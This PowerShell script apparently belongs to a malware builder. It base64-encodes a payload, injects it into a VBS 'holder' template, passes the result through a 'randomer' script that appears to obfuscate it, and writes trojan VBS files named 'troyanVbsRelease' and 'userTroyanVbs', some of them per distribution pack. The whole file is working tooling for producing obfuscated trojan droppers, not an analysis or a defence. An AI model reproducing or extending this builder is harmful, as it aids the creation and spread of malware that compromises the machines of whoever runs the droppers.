param (
    [string]$serverName, [string]$packId = ""
)

if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../../sys/current.ps1") -serverName $serverName



function Encode-FileToBase64 {
    param (
        [string]$inFile
    )
    if (-Not (Test-Path -Path $inFile)) {
        return "File $inFile not found."
    }
    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
    $encodedContent = [Convert]::ToBase64String($fileContent)
    return $encodedContent
}

function Decode-Base64StringToFile {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

function Convert-ArrayToQuotedString {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Array
    )

    # Process each element to enclose in double quotes and join with commas
    $quotedArray = $Array | ForEach-Object { "`"$_`"" }
    $joinedString = $quotedArray -join ","

    return $joinedString
}

Function Check-Array {
    param (
        [object]$InputObject
    )

    if ($null -ne $InputObject -and $InputObject.Length -gt 0) {
        return $true
    } else {
        return $false
    }
}

$holderPs = Encode-FileToBase64 -inFile $server.holderRelease

$holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")

$result = $holder
$result = $result -replace '0102', $holderPs

$outputFile = $server.userTroyanVbs  
 
if ([string]::IsNullOrEmpty($packId) -eq $false) {
    $pack = $server.pack.items | Where-Object { $_.id -eq $packId }
    if (-not $pack) {
        throw "Item with id '$packId' not found in pack items."
    }
    $outputFile= $pack.packFileVbs
}   

$result | Set-Content $server.troyanVbsDebug
& (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.troyanVbsDebug -outputFile $server.troyanVbsRelease -fileType vbs
Copy-Item -Path $server.troyanVbsRelease -Destination $outputFile -Force
